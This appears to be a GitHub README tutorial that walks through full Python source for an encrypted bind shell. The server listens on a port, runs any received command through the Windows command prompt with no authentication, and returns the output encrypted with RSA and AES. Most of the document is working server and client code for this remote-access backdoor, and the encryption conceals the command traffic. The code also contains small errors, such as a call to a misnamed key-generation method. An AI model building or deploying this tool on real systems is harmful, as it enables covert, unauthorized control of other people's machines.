# Encrypted Bind Shell with Hybrid Encryption 

## Overview

This program implements a bind shell using hybrid encryption with RSA and AES. The server listens for incoming connections and handles multiple clients using threading. An RSA key exchange is performed to securely share AES keys. The client encrypts commands with a unique AES key for each message, and the server executes the commands, sending back encrypted outputs.

## References

- [AES Symmetric Encryption](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
- [Python Socket Programming](https://docs.python.org/3/library/socket.html)
- [Python Cryptography Library](https://cryptography.io/en/latest/)
- [Python Threading](https://docs.python.org/3/library/threading.html)
- [RSA Asymmetric Encryption](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
- [Subprocess Module](https://docs.python.org/3/library/subprocess.html)

## Building the Script: Server Implementation

__Imports and Constants__

The server script begins by importing critical modules for network communication, command execution, and secure encryption.

```python
import os
import socket
import subprocess
import logging
import threading 

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
```

<br>

__Server Initialization__

The server's initialization process sets up critical configuration parameters, logging mechanisms, and prepares for secure communication by generating cryptographic keys.

This initialization method establishes the server's core configuration. The logging configuration provides detailed tracking of server activities, while the key pair generation creates the cryptographic foundation for secure communication.

```python
class EncryptedBindShell:
    def __init__(self): 
        self.host = "0.0.0.0"  # change this line
        self.port = 4444       # change this line

        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s'
        )
        self.logger = logging.getLogger(__name__)

        self.client_keys = {}

        self.server_private_key, self.server_public_key = self._generate_asymmetric_keys()
```

<br>

__Symmetric / Asymmetric Key Generation__

The key generation method creates a 4096-bit RSA key pair with a standard public exponent of 65537, providing a strong cryptographic basis for secure communication.

```python
def _generate_asymmetric_keys(self):
    self.logger.info("Generating 4096-bit RSA key pair")
    private = rsa.generate_private_key(
        public_exponent = 65537,
        key_size = 4096
    )
    public = private.public_key()

    return private, public
```

Similarly, the `_generate_symmetric_key` method generates a 256-bit AES key and a 128-bit initialization vector (IV) using the os.urandom function for secure random number generation.

```python
    def _generate_symmetric_key(self):
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        return aes_key, iv
```

<br>

__Message Decryption__

The decryption method implements a complex, multi-step process to securely decrypt messages received from clients.

This method demonstrates a hybrid decryption approach. It first validates the client's public key, then splits the encrypted payload. Using the server's private key, it decrypts the AES key and initialization vector, and finally uses these to decrypt the message payload.

```python
def _decrypt_message(self, client_address, encrypted_data):
    if not self.client_keys[client_address]:
        self.logger.error(f"Public key for {client_address[0]}:{client_address[1]} not found")
        return None

    encrypted_key_iv, encrypted_message = encrypted_data.split(b"::", 1)
    
    key_iv = self.server_private_key.decrypt(
        encrypted_key_iv,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    aes_key, iv = key_iv[:32], key_iv[32:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    decryptor = cipher.decryptor()
    decrypted_message = decryptor.update(encrypted_message) + decryptor.finalize()

    return decrypted_message.decode('utf-8')
```

<br>

__Message Encryption__

The encrypt_message method uses both symmetric and asymmetric encryption to secure a message. It starts by generating a random 256-bit AES key and a 128-bit initialization vector (IV) using os.urandom. The method then initializes an AES cipher in CFB mode with the generated key and IV, and encrypts the message with this cipher. Next, it encrypts the AES key and IV using the client's RSA public key with OAEP padding to ensure their secure transmission. The method concatenates the encrypted AES key/IV and the encrypted message, and returns the result.

```python
    def encrypt_message(self, client_address, message):
        if not self.client_keys[client_address]:
            raise ValueError("Client public key not received")
        
        # Generate a random AES key and IV
        aes_key, iv = self._generate_symmetric_key()
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
        encryptor = cipher.encryptor()
        encrypted_message = encryptor.update(message.encode('utf-8')) + encryptor.finalize()

        # Encrypt the AES key with the client's public key
        client_public_key = self.client_keys[client_address]
        encrypted_key = client_public_key.encrypt(
            aes_key + iv,  # Concatenate key and IV
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted_key + b"::" + encrypted_message
```

<br>

__Command Execution__

The command execution method allows the server to run system commands and capture their output.

Using the `subprocess` module, this method runs commands through the Windows command prompt, capturing both standard output and error streams. It provides logging for command execution status and returns the appropriate output.


```python
def execute_command(self, command):
    process = subprocess.run(
        f"cmd /c {command}",
        stderr=subprocess.PIPE,
        stdout=subprocess.PIPE,
        shell=True
    )
    
    if process.returncode == 0:
        result = process.stdout
        self.logger.info(f"Command '{command}' executed successfully.")
    else:
        result = process.stderr
        self.logger.error(f"Command '{command}' failed")

    return result
```

<br>

__Handling Client Connections__

The handle_client method manages individual client connections. It receives the client's public key, saves it, and sends the server's public key to the client. It then enters a loop to receive and decrypt commands, execute them, and send back the encrypted results.

<br>

__Initial Setup and Key Exchange__

```python
def handle_client(self, client_socket, client_address):
    try:
        client_public_key_data = client_socket.recv(4096)
        client_public_key = serialization.load_pem_public_key(client_public_key_data)

        self.client_keys[client_address] = client_public_key
        self.logger.info(f"Saved public key for client {client_address[0]}:{client_address[1]}")
        
        client_socket.send(
            self.server_public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

        client_socket.send(self.encrypt_message(client_address, "KEY_RECEIVED"))
```

In this part, the method performs the following:
1. Receive the client's public key data and deserializes it to an RSA public key object.
2. Store the client's public key in a dictionary for later use.
3. Log that the client's public key has been saved.
4. Send its own public key to the client in PEM format.
5. Send an encrypted confirmation message `KEY_RECEIVED` to the client indicating that the key exchange was successful.

<br>

__Command Handling and Cleanup__

```python
        while True:
            encrypted_data = client_socket.recv(4096)
            if not encrypted_data:
                break

            try:
                command = self._decrypt_message(client_address, encrypted_data)
                if command.lower() in ['exit', 'quit']:
                    break

                result = self.execute_command(command)
                encrypted_result = self.encrypt_message(client_address, result.decode('utf-8', errors='ignore'))
                client_socket.send(encrypted_result)

            except Exception as err:
                self.logger.error(err)
                break

    except Exception as err:
        self.logger.error(f"Client handler error: {err}")

    finally:
        self.logger.info(f"Closing connection on socket: {client_address[0]}:{client_address[1]}")
        client_socket.close()

        self.logger.info(f"Removing public key for client {client_address[0]}:{client_address[1]}")
        self.client_keys.pop(client_address)
```

In this part, the method handles commands and performs cleanup:
1. The server enters a loop to continuously receive encrypted commands from the client.
2. If no data is received, the loop breaks, indicating the client has disconnected.
3. The server attempts to decrypt the received data to get the command.
4. If the command is 'exit' or 'quit', the loop breaks, ending the session.
5. The server executes the decrypted command using the `execute_command` method.
6. The server encrypts the command output and sends it back to the client.
7. If an error occurs during decryption or execution, it logs the error and breaks the loop.
8. Finally, the server logs the disconnection, closes the client socket, and removes the client's public key from the dictionary.

<br>

__Server startup__

The `start` method initializes the server socket, binds it to the specified host and port, and listens for incoming client connections. For each new connection, it spawns a new thread to handle the client.

The socket is bound to the specified host and port, and the server starts listening for incoming connections with a backlog of 5. The server logs that it is listening for connections and enters an infinite loop to accept new client connections. 

For each connection, a new thread is created to handle the client using the `handle_client` method. If an exception occurs, it is logged as a critical error. 

```python
def start(self):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)

        self.logger.info(f"Listening on {self.host}:{self.port}")

        while True:
            client_socket, client_address = server_socket.accept()
            self.logger.info(f"Connection from {client_address[0]}:{client_address[1]}")
            client_thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, client_address)
            )
            client_thread.start()

    except Exception as err:
        self.logger.critical(f"Server error: {err}")

    finally:
        self.logger.info("Server shutting down, closing socket.")
        server_socket.close()
```

## Building the Script: Client Implementation

__Imports and Configuration__

The client script mirrors the server's cryptographic approach, focusing on establishing a secure, encrypted communication channel.

```python
import os
import socket
import threading
import logging

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
```

<br>

__Client Initialization__

The initialization establishes the client's core configuration. It sets up logging, generates a cryptographic key pair, and prepares a network socket for communication with the server.

```python
class BindShellClient:
    def __init__(self): 
        self.host = "0.0.0.0"  # change this line
        self.port = 4444       # change this line

        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s'
        )
        self.logger = logging.getLogger(__name__)

        self.client_private_key, self.client_public_key = self._generate_asymmetric_keys()

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_public_key = None
```

<br>

__Symmetric / Asymmetric Key Generation__

The key generation uses a 4096-bit key with a standard public exponent, providing strong cryptographic security for the communication channel.

```python
def _generate_asymmetric_keys(self):
    self.logger.info("Generating 4096-bit RSA key pair")
    private = rsa.generate_private_key(
        public_exponent = 65537,
        key_size = 4096
    )
    public = private.public_key()

    return private, public
```

Similarly, the `_generate_symmetric_key` method generates a 256-bit AES key and a 128-bit initialization vector (IV) using os.urandom for secure random number generation.

```python
    def _generate_symmetric_key(self):
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        return aes_key, iv
```

<br>

__Message Decryption__

This method splits the incoming data into the encrypted AES key/IV and the encrypted message. The AES key and IV are decrypted using the client's RSA private key with OAEP padding, which uses MGF1 and SHA-256 for padding and hashing, ensuring secure decryption. The decrypted AES key and IV initialize the AES cipher in CFB mode, which decrypts the message. Finally, the decrypted message is returned as a UTF-8 string.

```python
def _decrypt_message(self, encrypted_data):
    encrypted_key, encrypted_message = encrypted_data.split(b"::", 1)
    
    key_iv = self.client_private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    aes_key, iv = key_iv[:32], key_iv[32:]
    
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    decryptor = cipher.decryptor()
    decrypted_message = decryptor.update(encrypted_message) + decryptor.finalize()
    return decrypted_message.decode('utf-8')
```

<br>

__Message Encryption__

This method secures a message by generating a 256-bit AES key and a 128-bit IV using os.urandom for randomness. The message is encrypted using AES in CFB mode with the generated key and IV. The AES key and IV are then concatenated and encrypted using the server's RSA public key with OAEP padding, which includes MGF1 and SHA-256 for padding and hashing. The result is the encrypted key/IV and the encrypted message, concatenated and returned.

```python
def _encrypt_message(self, message):
    aes_key, iv = self._generate_symmetric_keys()    
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    encrypted_message = encryptor.update(message.encode("utf-8")) + encryptor.finalize()

    encrypted_key_iv = self.server_public_key.encrypt(
        aes_key + iv,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return encrypted_key_iv + b"::" + encrypted_message
```

<br>

__Display Prompt__

Displays a command prompt to the user.

```python
def display_prompt(self):
    print("\ncmd > ", end="", flush=True)
```

__Connection and Key Exchange__

Handles the secure establishment of communication with the server by sending the client's public key and receiving the server's public key, completing the initial key exchange.

```python
def connect(self):
    self.logger.info(f"Attempting to connect to {self.host}:{self.port}")
    self.socket.connect((self.host, self.port))

    self.logger.info(f"Performing key pair exchange")
    self.socket.send(
        self.client_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    )

    server_key_data = self.socket.recv(4096)
    self.server_public_key = serialization.load_pem_public_key(server_key_data)
    
    self.logger.info("Key exchange completed")
    return True
```

<br>

__Receive Response__

This method continuously listens for incoming encrypted data from the server, decrypts it using the client's asymmetric keys, and displays the decrypted message to the user. It reads up to 4096 bytes of data at a time, checks if the decrypted response is `KEY_RECEIVED` to acknowledge the key exchange, prints the decrypted response, and displays the command prompt for further input. Any exceptions are logged as errors.

```python
def receive_response(self):
    while True:
        try:
            encrypted_data = self.socket.recv(4096)
            if not encrypted_data:
                break

            response = self._decrypt_message(encrypted_data)
            if response == "KEY_RECEIVED":
                continue
            print(response)
            self.display_prompt()

        except Exception as err:
            self.logger.error(f"Error receiving data: {err}")
            break
```

<br>

__Start Client__

Handles the main loop, including connecting to the server, starting the response receiver thread, and processing user input.

```python
def start(self):
    try:
        if not self.connect():
            raise ConnectionError

        receive_thread = threading.Thread(target=self.receive_response)
        receive_thread.daemon = True
        receive_thread.start()
        self.display_prompt()

        while True:
            user_input = input()
            command = user_input.strip()
            encrypted_command = self._encrypt_message(command)

            self.socket.send(encrypted_command)
            if command in ["exit", "quit"]:
                self.logger.info("Exiting the interactive shell")
                break

    except ConnectionError:
        self.logger.error(f"Failed to connect to {self.host}:{self.port}")
    except Exception as err:
        self.logger.error(f"Client error: {err}")
    finally:
        self.socket.close()
```

## Example Output

![demo](https://github.com/user-attachments/assets/ea6b2c4a-557a-4d06-9575-cfaabf6328ac)

